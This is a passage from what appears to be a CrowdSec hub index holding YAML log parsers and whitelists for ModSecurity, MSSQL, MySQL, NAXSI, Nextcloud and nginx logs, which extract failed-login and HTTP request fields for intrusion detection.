MODSECHOSTNAME2: \"\\\\[hostname ['\\\"]%{DATA:targethost}[\\\"']\\\\]\"\n  MODSECURI2: \"\\\\[uri [\\\"']%{DATA:targeturi}[\\\"']\\\\]\"\n  MODSECUID2: \"\\\\[unique_id \\\"%{DATA:uniqueid}\\\"\\\\]\"\n  MODSECREF2: \"\\\\[ref \\\"%{DATA:ref}\\\"\\\\]\"\n  MODSECAPACHEERROR2: \"%{MODSECPREFIX2} %{MODSECRULEFILE2} %{MODSECRULELINE2} (?:%{MODSECMATCHOFFSET2} )?(?:%{MODSECRULEID2} )?(?:%{MODSECRULEREV2} )?(?:%{MODSECRULEMSG2} )?(?:%{MODSECRULEDATA2} )?(?:%{MODSECRULESEVERITY2} )?(?:%{MODSECRULEVERS2} )?%{MODSECRULETAGS2}%{MODSECHOSTNAME2} %{MODSECURI2} %{MODSECUID2}\"\n  MODSECNGINXERROR: \"%{MODSECNGINXPREFIX} %{MODSECRULEFILE2} %{MODSECRULELINE2} (?:%{MODSECMATCHOFFSET2} )?(?:%{MODSECRULEID2} )?(?:%{MODSECRULEREV2} )?(?:%{MODSECRULEMSG2} )?(?:%{MODSECRULEDATA2} )?(?:%{MODSECRULESEVERITY2} )?(?:%{MODSECRULEVERS2} )?(?:%{MODSECRULEMATURITY} )?(?:%{MODSECRULEACCURACY} )?%{MODSECRULETAGS2}%{MODSECHOSTNAME2} %{MODSECURI2} %{MODSECUID2} %{MODSECREF2}, %{NGINXERRORSUFFIX}\"\n\nnodes:\n  - grok:\n      name: MODSECAPACHEERROR2\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: modsecurity\n        - meta: source_ip\n          expression: evt.Parsed.sourcehost\n        - target: evt.StrTime\n          expression: evt.Parsed.timestamp\n        - meta: rule_id\n          expression: evt.Parsed.ruleid\n        - meta: modsec_message\n          expression: evt.Parsed.rulemessage\n        - meta: modsec_ruledata\n          expression: evt.Parsed.ruledata\n  - grok:\n      name: MODSECNGINXERROR\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: modsecurity\n        - meta: source_ip\n          expression: evt.Parsed.remote_addr\n        - target: evt.StrTime\n          expression: evt.Parsed.time\n        - meta: rule_id\n          expression: evt.Parsed.ruleid\n        - meta: modsec_message\n          expression: evt.Parsed.rulemessage\n        - meta: modsec_ruledata\n          expression: evt.Parsed.ruledata\n\n", "description": "A parser for modsecurity WAF", "path": "parsers/s01-parse/crowdsecurity/modsecurity.yaml", "stage": "s01-parse", "version": "1.1", "versions": {"0.1": {"digest": "8db1b74ef6681ebe8e9fcc09ed271830a330f3aa5dd3e273a98b3906c334f715"}, "0.2": {"digest": "522f242c438219ae659e775aa123c252d9dcebf8bf808d644eb8a0069ed87919"}, "0.3": {"digest": "f173c890dc7abadbeedf7e99d11ae8834e0dfc90e21684b5ea71f267a5a506f5"}, "0.4": {"digest": "cd4f670cbb0b41d6e19d61170cfb60868832bf19e8393235d857dd356f33df2a"}, "0.5": {"digest": "bc41dae1bc38731159c2c141ed9a0e4f99d6c8ec525555c6915a5ee376716da2"}, "0.6": {"digest": "e598abbbe73a831393605f33b513cbf92b1f568a37f1388a3aa9fa7065d1514e"}, "0.7": {"digest": "beee35fd2bb445549f0ef2f1be21dee30019aaaf6522a86e9bc114df6ecae73f"}, "0.8": {"digest": "2f897a99b1d318627537f760a09194d62cb7d3cf6f2673b48815b2bd28a4279e"}, "0.9": {"digest": "051d3c5c4b723913221f8e864f8ae21e491d79c139f3f8776e1591b5cba48582"}, "1.0": {"digest": "4f670402660442a3d762dddeabc497af0e597fdb3fd3a1dce366cf7260df941e"}, "1.1": {"digest": "b1a41b5364b29c0310f5897974e392805c4bba493def611bfd126e1975353af1"}}}, "crowdsecurity/mssql-logs": {"content": "onsuccess: next_stage\nname: crowdsecurity/mssql-logs\ndescription: \"Parse mssql logs\"\nfilter: \"evt.Parsed.Channel == 'Application' && (evt.Parsed.Source == 'MSSQLSERVER' || evt.Parsed.Source startsWith 'MSSQL$') && evt.Parsed.EventID == '18456'\"\nnodes:\n  - grok:\n      pattern: \"Reason: Password did not match that for the login provided\\\\.\"\n      expression: XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[2]\")\n    nodes:\n      - grok:\n          pattern: \"\\\\[CLIENT: %{IP:source_ip}\\\\]\"\n          expression: XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[3]\")\n          statics:\n            - meta: source_ip\n              expression: evt.Parsed.source_ip\n    statics:\n      - meta: subtype\n        value: bad_password\n  - grok:\n      pattern: \"Reason: Could not find a login matching the name provided\\\\.\"\n      expression: XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[2]\")\n    nodes:\n      - grok:\n          pattern: \"\\\\[CLIENT: %{IP:source_ip}\\\\]\"\n          expression: XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[3]\")\n          statics:\n            - meta: source_ip\n              expression: evt.Parsed.source_ip\n    statics:\n      - meta: subtype\n        value: bad_user\nstatics:\n  - meta: log_type\n    value: mssql_failed_auth\n  - meta: user\n    expression: XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[1]\")\n---\nonsuccess: next_stage\nname: crowdsecurity/mssql-text-logs\ndescription: \"Parse mssql logs\"\nfilter: \"evt.Parsed.program == 'mssql'\"\npattern_syntax:\n  DATE_YMD: \"%{YEAR:year}-%{MONTHNUM:month}-%{MONTHDAY:day}\"\nnodes:\n  - grok:\n      pattern: \"%{DATE_YMD:date} %{TIME:time} Logon.*Login failed for user '%{NOTDQUOTE:user}'. Reason: %{GREEDYDATA:reason_message}. \\\\[CLIENT: %{IPORHOST:source_ip}\\\\]\"\n      apply_on: message\n    onsuccess: next_stage\n    nodes:\n      - filter: \"evt.Parsed.reason_message == 'Password did not match that for the login provided'\"\n        onsuccess: next_stage\n        statics:\n          - meta: subtype\n            value: bad_password\n      - filter: \"evt.Parsed.reason_message == 'Could not find a login matching the name provided'\"\n        onsuccess: next_stage\n        statics:\n          - meta: subtype\n            value: bad_user\nstatics:\n    - meta: service\n      value: mssql\n    - meta: log_type\n      value: mssql_failed_auth\n    - meta: source_ip\n      expression: \"evt.Parsed.source_ip\"\n    - target: evt.StrTime\n      expression: \"evt.Parsed.date + ' ' + evt.Parsed.time\"", "description": "Parse mssql logs", "path": "parsers/s01-parse/crowdsecurity/mssql-logs.yaml", "stage": "s01-parse", "version": "0.3", "versions": {"0.1": {"digest": "9c99578104a9158ada41bb8dd920575a83d494e6f6e2d166eb5773fb4d7023b1"}, "0.2": {"digest": "2c39d0c3f1cf4124d5e3cc113c733b2ef220522d01706b5434382240de10b147"}, "0.3": {"digest": "b9dc0a3b53d5e1ad6eeae3e1beb04d01afe62111e80d5871b77caee2e7172cfd"}}}, "crowdsecurity/mysql-logs": {"content": "onsuccess: next_stage\nname: crowdsecurity/mysql-logs\ndescription: \"Parse MySQL logs\"\nfilter: \"evt.Parsed.program == 'mysql'\"\npattern_syntax:\n  MYSQL_ACCESS_DENIED: \"Access denied for user '%{DATA:user}'@'%{IP:source_ip}' \\\\(using password: %{WORD:using_password}\\\\)\" \nnodes:\n  - grok:\n      pattern: \"%{TIMESTAMP_ISO8601:time} %{NUMBER} \\\\[Note\\\\]( \\\\[%{DATA:err_code}\\\\] \\\\[%{DATA:subsystem}\\\\])? %{MYSQL_ACCESS_DENIED}\"\n      apply_on: message\n  - grok:\n      pattern: \"%{TIMESTAMP_ISO8601:time}.*%{NUMBER} Connect.*%{MYSQL_ACCESS_DENIED}\"\n      apply_on: message\nstatics:\n  - meta: log_type\n    value: mysql_failed_auth\n  - meta: source_ip\n    expression: \"evt.Parsed.source_ip\"\n  - target: evt.StrTime\n    expression: evt.Parsed.time\n  - meta: user\n    expression: \"evt.Parsed.user\"\n", "description": "Parse MySQL logs", "path": "parsers/s01-parse/crowdsecurity/mysql-logs.yaml", "stage": "s01-parse", "version": "0.4", "versions": {"0.1": {"digest": "9ad9acb6f2c62c6d38c8b662a22af412f6bb0d73f14197b5136cc2c777a3865b"}, "0.2": {"digest": "4d2fb3da27c9e65b95fe74f962b0ed1f246f2312ca48b8e9fc95e073488a0809"}, "0.3": {"digest": "e87dcc2182097881e9b90183917fa6e482e5dbe5a03420aab7c0d62b039cb0dd"}, "0.4": {"digest": "f079cdfce412548dba1989be5b3491bfcd425790b91c4331c932d930169f8111"}}}, "crowdsecurity/naxsi-logs": {"content": "#let's try to post-process nginx error log to have naxsi pattern\nfilter: \"evt.Meta.log_type == 'http_error-log' && evt.Parsed.program == 'nginx'\"\ndescription: \"Enrich logs if its from NAXSI\"\nname: crowdsecurity/naxsi-logs\ngrok:\n  name: \"NAXSI_EXLOG\"\n  apply_on: message\nstatics:\n  - target: evt.Meta.log_type\n    value: waf_naxsi-log\n  - meta: source_ip\n    expression: \"evt.Parsed.naxsi_src_ip\"\n  - meta: http_path\n    expression: \"evt.Parsed.http_path\"\n  - meta: dest_ip\n    expression: \"evt.Parsed.target_ip\"", "description": "Enrich logs if its from NAXSI", "path": "parsers/s02-enrich/crowdsecurity/naxsi-logs.yaml", "stage": "s02-enrich", "version": "0.1", "versions": {"0.1": {"digest": "c8b9f9ffdc82619cfc9ef10be9ba18513f702688d86d5c48a5cffb525499a8f0"}}}, "crowdsecurity/nextcloud-logs": {"content": "---\nonsuccess: next_stage\nfilter: \"Upper(evt.Parsed.program) == 'NEXTCLOUD'\"\nname: crowdsecurity/nextcloud-logs\ndescription: \"Parse nextcloud logs\"\npattern_syntax:\n  NEXTCLOUD_USER: '[a-zA-Z0-9\\.\\@\\-\\+_%]+'\nnodes:\n  - grok:\n      pattern: 'Login failed: ''?%{NEXTCLOUD_USER:target_user}''? \\(Remote IP: ''?%{IP:source_ip}''?\\)'\n      expression: JsonExtract(evt.Parsed.message, \"message\")\n    statics:\n      - meta: target_user\n        expression: \"evt.Parsed.target_user\"\n      - meta: log_type\n        value: nextcloud_failed_auth\n  - grok:\n      pattern: 'Bruteforce attempt from \\\\?\"%{IP:source_ip}\\\\?\" detected for action \\\\?\"%{DATA:action}\\\\?\"'\n      expression: JsonExtract(evt.Parsed.message, \"message\")\n    statics:\n      - meta: action\n        expression: \"evt.Parsed.action\"\n      - meta: log_type\n        value: nextcloud_bruteforce_attempt\n\n#{\"reqId\":\"dCA39mNG3NHLwbibVCFp\",\"level\":1,\"time\":\"2023-02-14T17:28:33+00:00\",\"remoteAddr\":\"172.18.0.200\",\"user\":\"--\",\"app\":\"core\",\"method\":\"GET\",\"url\":\"/\",\"message\":\"Trusted domain error. \\\"172.18.0.200\\\" tried to access using \\\"kloot.ronsmans.eu\\\" as host.\",\"userAgent\":\"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/109.0\",\"version\":\"25.0.3.2\",\"data\":{\"app\":\"core\"}}\n\n  - grok:\n      pattern: 'Trusted domain error. \\\\\"%{IP:source_ip}\\\\\".*'\n      expression: JsonExtract(evt.Parsed.message, \"message\")\n    statics:\n      - meta: log_type\n        value: nextcloud_domain_error\n\nstatics:\n  - meta: service\n    value: nextcloud\n  - meta: source_ip\n    expression: \"evt.Parsed.source_ip\"\n  - target: evt.StrTime\n    expression: JsonExtract(evt.Parsed.message, \"time\")\n", "description": "Parse nextcloud logs", "path": "parsers/s01-parse/crowdsecurity/nextcloud-logs.yaml", "stage": "s01-parse", "version": "0.4", "versions": {"0.1": {"digest": "072ff18cde784aedbe88ded5742860fcdf5000c3b56f10ca4d5fc2ec0b8166d7"}, "0.2": {"digest": "a83ed98682243d1e6fd1b07e763746f7dd05a2bffb18f6cbad646ec863b622de"}, "0.3": {"digest": "21f42e86e1dbe439df7748ad883fcb34ab57096fb0ef4175e76eee0ef503bccd"}, "0.4": {"digest": "07833ad30c11cac2b9faf32d6963b8ed4c87c86defb8f437baf182b9ce7bef00"}}}, "crowdsecurity/nextcloud-whitelist": {"content": "name: crowdsecurity/nextcloud-whitelist\ndescription: \"Whitelist events from nextcloud\"\nfilter: \"evt.Meta.service == 'http' && evt.Meta.log_type in ['http_access-log', 'http_error-log']\"\nwhitelist:\n  reason: \"Nextcloud Whitelist\"\n  expression:\n   - evt.Meta.http_status == '404' && evt.Meta.http_verb == 'GET' && evt.Parsed.file_ext == '.vcf' && evt.Parsed.http_args contains \"photo\" #Contacts app .vcf missing photo\n   - evt.Meta.http_status == '404' && evt.Meta.http_verb == 'GET' && evt.Meta.http_path contains '/apps/files_versions/preview' && evt.Parsed.http_args contains 'version' #Backup app missing file version\n   - evt.Meta.http_status == '404' && evt.Meta.http_verb == 'GET' && evt.Meta.http_path contains '/apps/photos/api/v1/preview' && evt.Parsed.http_args contains 'x' && evt.Parsed.http_args contains 'y' #Photo app loads all previews as small panes, but can 404\n   - evt.Meta.http_status == '404' && evt.Meta.http_verb == 'GET' && evt.Parsed.request contains '/core/preview' && evt.Parsed.http_args contains 'x=' && evt.Parsed.http_args contains 'y=' && evt.Parsed.http_args contains 'fileId=' #File preview often 404s while searching\n   - evt.Meta.http_status in ['404', '200'] && evt.Meta.http_verb in ['PROPFIND', 'GET'] && evt.Meta.http_path matches '^/remote.php/(web)?dav/' #Uploading new files via WebDAV always produces a 404\n   - evt.Meta.http_status == '404' && evt.Meta.http_verb == 'PROPFIND' && evt.Parsed.file_dir startsWith '/public.php/webdav/' && lower(evt.Parsed.file_name) in ['readme.md', 'lisez%20moi.md'] # Resharing scans for readme to check existence\n   - evt.Meta.http_status in ['200', '204', '404', '400'] && evt.Meta.http_verb == 'GET' && evt.Meta.http_path matches '/apps/mail/api/avatars/(url|image)/' #When loading mail contacts the avatars may get 404, or if you have a lot of contacts, it may trigger crawl-non-static\n   - evt.Meta.http_status == '200' && evt.Parsed.static_ressource == 'false' && evt.Meta.http_verb == 'GET' && evt.Meta.http_path contains '/apps/photos/api/v1/preview' && evt.Parsed.http_args contains '&x=' && evt.Parsed.http_args contains '&y=' && evt.Parsed.http_args contains 'etag=' #When loading multiple images inside Nextcloud Photos, HTTP Crawl non statics is triggered since the images look like dynamic assets.\n   - evt.Meta.http_status == '404' && evt.Meta.http_verb == 'GET' && evt.Parsed.request matches '/ocs/v2.php/apps/text(/public)?/workspace' && evt.Parsed.http_args contains 'path=%2F' #When opening folders in Nextcloud Files that don't contain a readme.md 404 error is thrown\n   - evt.Meta.http_status == '404' && evt.Meta.http_verb == 'GET' && evt.Meta.http_path contains '/apps/files_trashbin/preview' && evt.Parsed.http_args contains 'fileId=' # 404 error thrown when preview is missing for files in trash bin\n   - evt.Meta.http_status == '404' && evt.Meta.http_verb == 'GET' && evt.Meta.http_path matches '\\\\/apps\\\\/files\\\\/api\\\\/v1\\\\/thumbnail\\\\/(\\\\d+)/(\\\\d+)'\n   - evt.Meta.http_status == '404' && evt.Meta.http_verb == 'GET' && evt.Meta.http_path contains '/apps/bookmarks/bookmark' && (evt.Meta.http_path endsWith 'favicon' || evt.Meta.http_path endsWith 'image') #When loading NC bookmarks: some entries might have no favicon or no image\n   - evt.Meta.http_status == '404' && evt.Meta.http_verb == 'GET' && evt.Meta.http_path contains '/apps/bookmarks/folder' && evt.Meta.http_path endsWith 'publictoken' #When loading NC bookmarks: private folders have no publictoken\n   - evt.Meta.http_status == '403' && evt.Meta.http_verb in ['GET', 'PUT'] && evt.Meta.http_path matches '\\\\/apps\\\\/mail\\\\/api\\\\/messages\\\\/(\\\\d+)\\\\/(flags|dkim|itineraries)' #When loading mail messages, some requests are forbidden due to message deletion by another user in shared inboxes\n   - evt.Meta.http_status == '404' && evt.Meta.http_verb == 'GET' && evt.Meta.http_path contains '/apps/files_sharing/publicpreview' && evt.Parsed.http_args matches 'x=\\\\d+' && evt.Parsed.http_args matches 'y=\\\\d+' #Public preview thumbnail in files sharing app can 404 if file cannot be a thumbnail\n   - evt.Meta.http_status == '403' && evt.Meta.http_verb == 'POST' && evt.Meta.http_path matches '\\\\/apps\\\\/text\\\\/session\\\\/(\\\\d+)\\\\/push' #When attempting to push changes to a session that has expired\n   - evt.Meta.http_status == '304' && evt.Meta.http_verb == 'GET' && evt.Meta.http_path startsWith '/avatar' #When loading avatars in Nextcloud Talk, the request may return a 304 Not Modified if the avatar has not changed\n   - evt.Meta.http_status == '400' && evt.Meta.http_verb == 'GET' && evt.Meta.http_path contains '/apps/mail/api/messages' #When loading mail messages, the request may return a 400 Bad Request", "description": "Whitelist events from nextcloud", "path": "parsers/s02-enrich/crowdsecurity/nextcloud-whitelist.yaml", "stage": "s02-enrich", "version": "2.3", "versions": {"0.1": {"digest": "7685c823a398a711b76afea742ebeb2637ac55c829eafba841b63504b1e2228e"}, "0.2": {"digest": "15ef491d0966d5796364e53ee9d1755888696feaff16522b2a1b06536b47ea78"}, "0.3": {"digest": "a8c2afddb978e2dd08559c11dfd1a8d220b3667047adc3c4140ee6643b7ae8fa"}, "0.4": {"digest": "82fdff4937ffd65362b26dc5956bbe366185241f8c42a72c5c760dfc0dcaae87"}, "0.5": {"digest": "b5e9ba6ad48c09317260c89ec36c3501e520a7655fb8d476ffb861fb656099c2"}, "0.6": {"digest": "ef87b424f23e583ab71adc0d8ff5ede0778e8ad45884b17b261babbf5e9619e3"}, "0.7": {"digest": "51a59c210b4b63883c62328a08ac1577257cd4910bd7a44b92285a80596c4a5e"}, "0.8": {"digest": "92408f18443f074036c7eb1d3b948b452f8e29e9ba2b2fca2e118cb98437f4e0"}, "0.9": {"digest": "abb7cfd6a77a94a9c7347065ccbb3964408e51d4d58b3092f009abb65c2cb579"}, "1.0": {"digest": "a1e5cb85bb64594220a390b82db288534feb73b99cce25cb13776fcd63a1e75c"}, "1.1": {"digest": "cb057942be9f210cdd433dd81f930fb8c6fbf661f80311261d56c8193d122de8"}, "1.2": {"digest": "0d272fbbff26282cd2dce279d52beb47d12f5e83889f3b9de354010f43184781"}, "1.3": {"digest": "8e85f504f8d68b9cc562e062202d562ef1933e3b7ae28ec28013087789cadac6"}, "1.4": {"digest": "d3b07f67fe073aeb223bbfa7b8f37dabc2ca5bee2cc387eea7c7a38c0500e03f"}, "1.5": {"digest": "182bfd786d0a39bf51d74053aeba5576873012728c42abd5f8eccc7b8cc59187"}, "1.6": {"digest": "86a2f6c62cfcf82be7df126a90c34ffdbf9e22bf60d7ee2e9a2449a81d266371"}, "1.7": {"digest": "a52d1f2d88cacd109a189ddef014b80807587d892f2e57e18ac5e48ba70d33aa"}, "1.8": {"digest": "ae975be5313d9b89c9ec077d26eb6c91ed561b89ad3f68a09262c97a396a8c68"}, "1.9": {"digest": "985f65fff8a421032c706a61ac18a8ac2e1f33831f7b43cae6bb2a87984da44d"}, "2.0": {"digest": "16fcce770ca414c8229d70604af3dfa6598908f74228e05a6053ed5a31a6e7c1"}, "2.1": {"digest": "18f5585748359a28eb0a2f8bb995158ae45a1a863dd299c572f75406d1e37b85"}, "2.2": {"digest": "91440fe21b99fe4219c4f6d9aed1c85d3663da3eb761790afb78ddac9c447b62"}, "2.3": {"digest": "716c5dcb99a44f99336da4d642876774b60a9867c6205d9d4ac8c99c7e1f880a"}}}, "crowdsecurity/nginx-logs": {"content": "filter: \"evt.Parsed.program startsWith 'nginx'\"\nonsuccess: next_stage\nname: crowdsecurity/nginx-logs\ndescription: \"Parse nginx access and error logs\"\npattern_syntax:\n  NGCUSTOMUSER: '[a-zA-Z0-9\\.\\@\\-\\+_%]+'\n  NGCUSTOMURIPATH: \"(?:/[A-Za-z0-9$.+!*'\\\\(\\\\)\\\\{\\\\},~:;=@\\\\#%&_\\\\-]*)+\"\n  NGCUSTOMURIPATHPARAM: '%{NGCUSTOMURIPATH}(?:%{URIPARAM})?'\n  NPMPLUSFQDN: '%{IPORHOST}||%{DATA}'\n  NGCACHESTATUS: 'HIT|MISS|BYPASS|EXPIRED|STALE|UPDATING|REVALIDATED|-'\n  NUM_OR_DASH: '-|\\d*'\nnodes:\n  - grok:\n      pattern: '(%{IPORHOST:target_fqdn}(:%{INT:port})? )?%{IPORHOST:remote_addr} - (%{NGCUSTOMUSER:remote_user} )?\\[%{HTTPDATE:time_local}\\] \"%{WORD:verb} %{DATA:request} HTTP/%{NUMBER:http_version}\" %{NUMBER:status} %{NUMBER:body_bytes_sent} \"%{NOTDQUOTE:http_referer}\" \"%{NOTDQUOTE:http_user_agent}\"( %{NUMBER:request_length} %{NUMBER:request_time} \\[%{DATA:proxy_upstream_name}\\] \\[%{DATA:proxy_alternative_upstream_name}\\])?'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: http_access-log\n        - target: evt.StrTime\n          expression: evt.Parsed.time_local\n  - grok:\n      # and this one the error log\n      pattern: '(%{IPORHOST:target_fqdn} )?%{NGINXERRTIME:time} \\[%{LOGLEVEL:loglevel}\\] %{NONNEGINT:pid}#%{NONNEGINT:tid}: (\\*%{NONNEGINT:cid} )?%{GREEDYDATA:message}, client: %{IPORHOST:remote_addr}, server: %{DATA:target_fqdn}, request: \"%{WORD:verb} ([^/]+)?%{NGCUSTOMURIPATHPARAM:request}( HTTP/%{NUMBER:http_version})?\", host: \"%{IPORHOST}(:%{NONNEGINT})?\"'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: http_error-log\n        - target: evt.StrTime\n          expression: evt.Parsed.time\n    pattern_syntax:\n      NO_DOUBLE_QUOTE: '[^\"]+'\n    onsuccess: next_stage\n    nodes:\n      - filter: \"evt.Parsed.message contains 'was not found in'\"\n        pattern_syntax:\n          USER_NOT_FOUND: 'user \"%{NO_DOUBLE_QUOTE:username}\" was not found in \"%{NO_DOUBLE_QUOTE}\"'\n        grok:\n          pattern: '%{USER_NOT_FOUND}'\n          apply_on: message\n        statics:\n          - meta: sub_type\n            value: \"auth_fail\"\n          - meta: username\n            expression: evt.Parsed.username\n      - filter: \"evt.Parsed.message contains 'password mismatch'\"\n        pattern_syntax:\n          PASSWORD_MISMATCH: 'user \"%{NO_DOUBLE_QUOTE:username}\": password mismatch'\n        grok:\n          pattern: '%{PASSWORD_MISMATCH}'\n          apply_on: message\n        statics:\n          - meta: sub_type\n            value: \"auth_fail\"\n          - meta: username\n            expression: evt.Parsed.username\n      - filter: \"evt.Parsed.message contains 'limiting requests, excess'\"\n        statics:\n          - meta: sub_type\n            value: \"req_limit_exceeded\"\n  ## Parse malformed requests\n  - grok:\n      pattern: '(%{IPORHOST:target_fqdn} )?%{IPORHOST:remote_addr} - (%{NGUSER:remote_user})? \\[%{HTTPDATE:time_local}\\] \"%{DATA:request}\" %{NUMBER:status} %{NUMBER:body_bytes_sent} \"%{NOTDQUOTE:http_referer}\" \"%{NOTDQUOTE:http_user_agent}\"( %{NUMBER:request_length} %{NUMBER:request_time} \\[%{DATA:proxy_upstream_name}\\] \\[%{DATA:proxy_alternative_upstream_name}\\])?'\n      apply_on: message\n    statics:\n      - meta: log_type\n        value: http_access-log\n      - target: evt.StrTime\n        expression: evt.Parsed.time_local\n  ## Catch NPMplus access logs that might be sent to nginx parser\n  - grok:\n      pattern: '\\[%{HTTPDATE:time_local}\\] %{NPMPLUSFQDN:target_fqdn} %{IPORHOST:remote_addr} %{NUMBER:request_time} \"%{WORD:verb} %{DATA:request} HTTP/%{NUMBER:http_version}\" %{NUMBER:status} %{NUMBER:body_bytes_sent} %{NUMBER:bytes_sent} %{DATA:http_referer} %{GREEDYDATA:http_user_agent}'\n      apply_on: message\n    statics:\n      - meta: log_type\n        value: http_access-log\n      - target: evt.StrTime\n        expression: evt.Parsed.time_local\n  ## Catch NPMplus malformed access logs\n  - grok:\n      pattern: '\\[%{HTTPDATE:time_local}\\] %{NPMPLUSFQDN:target_fqdn} %{IPORHOST:remote_addr} %{NUMBER:request_time} \"%{DATA:request}\" %{NUMBER:status} %{NUMBER:body_bytes_sent} %{NUMBER:bytes_sent} %{DATA:http_referer} %{GREEDYDATA:http_user_agent}'\n      apply_on: message\n    statics:\n      - meta: log_type\n        value: http_access-log\n      - target: evt.StrTime\n        expression: evt.Parsed.time_local\n  ## Catch nginx-proxy-manager logs that might be tagged as npm\n  - grok:\n      pattern: '\\[%{HTTPDATE:time_local}\\]( %{NGCACHESTATUS:upstream_cache_status} %{NUM_OR_DASH:upstream_status})? %{NUMBER:status} - %{WORD:verb} %{WORD:scheme} %{IPORHOST:target_fqdn} \\\"%{NOTDQUOTE:request}\\\" \\[Client %{IPORHOST:remote_addr}\\] \\[Length %{NUMBER:body_bytes_sent}\\] \\[Gzip %{DATA:gzip_ratio}\\]( \\[Sent-to %{DATA:target_server}\\])? \\\"%{NOTDQUOTE:http_user_agent}\\\" \\\"%{NOTDQUOTE:http_referer}\\\"'\n      apply_on: message\n    statics:\n      - meta: log_type\n        value: http_access-log\n      - target: evt.StrTime\n        expression: evt.Parsed.time_local\n    # these ones apply for both grok patterns\nstatics:\n  - meta: service\n    value: http\n  - meta: source_ip\n    expression: \"evt.Parsed.remote_addr\"\n  - meta: http_status\n    expression: \"evt.Parsed.status\"\n  - meta: http_path\n    expression: \"evt.Parsed.request\"\n  - meta: http_verb\n    expression: \"evt.Parsed.verb\"\n  - meta: http_user_agent\n    expression: \"evt.Parsed.http_user_agent\"\n  - meta: target_fqdn\n    expression: \"evt.Parsed.target_fqdn\"\n", "description": "Parse nginx access and error logs", "path": "parsers/s01-parse/crowdsecurity/nginx-logs.yaml", "stage": "s01-parse", "version": "2.0", "versions": {"0.1": {"digest": "60ba29ab5a5a49214664344b57403fab932e70bb1493203e83dc7df4f66b2059"}, "0.2": {"digest": "eae9b00d93c9e86f4b909bf0b0ce7dee821834702bc99c29213ebeca86054367"}, "0.3": {"digest": "7e6aeff6e07708806ffdc92b81b290cb41da8ddf95c2a1933f59f6b36ba62ace"}, "0.4": {"digest": "c1a14a662419b6edc17078467cea654082f02925961341e29fead330d11174ff"}, "0.5": {"digest": "81aee3a0a3eb3f603d846ba17b7efbae49d1169a13a49099a4e16b929cc20747"}, "0.6": {"digest": "1c1ac2988fce3691f5b571886921ba4d92563ba739756b9d112c58370e55a830"}, "0.7": {"digest": "2e209cb2f4277ccc854254a3dc627bc3d96e9f29ccb4756129d9b0c32964515e"}, "0.8": {"digest": "ea536d0d2c336ffc1720bb6d7678839f0488c1fca96614327396afd2f92ae9fc"}, "0.9": {"digest": "b30a1fb8efb8148f9444587a8bfb9558fd6c28f898644fd140f7995ffa302c68"}, "1.0": {"digest": "3e1f4e967e6088b83b8191c357cd5dc8ab5842200ffd47de7b5e8ddd8f2b28f7"}, "1.1": {"digest": "2d3bc9c768099ff55fc8948879bf3f57c35d37f834916a490b72094d5dc8812d"}, "1.2": {"digest": "e2cf65e3272cf7c269ffcb2282f6e6f9169a8acec98a97acae96d90f3f8b30dd"}, "1.3": {"digest": "b76ec30d100908555f3d2085f12338b6366a6286cbf00dc5ae590cc7d8f7373f"}, "1.4": {"digest": "ffd447fc906aa86bc3fa4c352d0d0829074c999d9f5257c6a20728c58a237e3a"}, "1.5": {"digest": "1948e74edab6e6fa23f70675e2883b726d4e0394314dafaad2b9819762b92b34"}, "1.6": {"digest": "538990ce5b01974ddd29c948de56322b92de56f6d9e70fc7f45415ce8af3858d"}, "1.7": {"digest": "f6818d92a779ff63fc4bae96e646da09820e97f93758f5620ae9dd14c8f1e5e5"}, "1.8": {"digest": "22fc05485e0fe69f9891692762a8f35b1d54ced45fa4815a43c379353c914db0"}, "1.9": {"digest": "8b4a92c2f11fd42f53312abf9a60edc7400d36ef1082c054e1cdc4a565411b2d"}, "2.0": {"digest": "ee5cb4f964265c44d51b5d3cbed83f40a63cf00f66f2c613f9a3fa090615ea60"}}}, "crowdsecurity/nginx-proxy-manager-logs": {"content": "#\nfilter: \"evt.Parsed.program startsWith 'nginx-proxy-manager'\"\nonsuccess: next_stage\nname: crowdsecurity/nginx-proxy-manager-logs\ndescription: \"Parse Nginx Proxy Manager access and error logs\"\npattern_syntax:\n  NGCACHESTATUS: 'HIT|MISS|BYPASS|EXPIRED|STALE|UPDATING|REVALIDATED|-'\n  NUM_OR_DASH: '-|\\d*'\n  NO_DOUBLE_QUOTE: '[^\"]+'\n  USER_NOT_FOUND: 'user \"%{NO_DOUBLE_QUOTE:username}\" was not found in \"%{NO_DOUBLE_QUOTE}\"'\n  PASSWORD_MISMATCH: 'user \"%{NO_DOUBLE_QUOTE:username}\": password mismatch'\nnodes:\n  # For Proxy hosts logs (handles both new and legacy formats with optional upstream status)\n  - grok:\n      pattern: '\\[%{HTTPDATE:time_local}\\]( %{NGCACHESTATUS:upstream_cache_status} %{NUM_OR_DASH:upstream_status})? %{NUMBER:status} - %{WORD:verb} %{WORD:scheme} %{IPORHOST:target_fqdn} \\\"%{NOTDQUOTE:request}\\\" \\[Client %{IPORHOST:remote_addr}\\] \\[Length %{NUMBER:body_bytes_sent}\\] \\[Gzip %{DATA:gzip_ratio}\\]( \\[Sent-to %{DATA:target_server}\\])? \\\"%{NOTDQUOTE:http_user_agent}\\\" \\\"%{NOTDQUOTE:http_referer}\\\"'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: http_access-log\n        - target: evt.StrTime\n          expression: evt.Parsed.time_local\n  # For Default host logs\n  - grok:\n      pattern: '(%{IPORHOST:target_fqdn} )?%{IPORHOST:remote_addr} - (%{NGUSER:remote_user})? \\[%{HTTPDATE:time_local}\\] \"%{WORD:verb} %{DATA:request} HTTP/%{NUMBER:http_version}\" %{NUMBER:status} %{NUMBER:body_bytes_sent} \"%{NOTDQUOTE:http_referer}\" \"%{NOTDQUOTE:http_user_agent}\"( %{NUMBER:request_length} %{NUMBER:request_time} \\[%{DATA:proxy_upstream_name}\\] \\[%{DATA:proxy_alternative_upstream_name}\\])?'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: http_access-log\n        - target: evt.StrTime\n          expression: 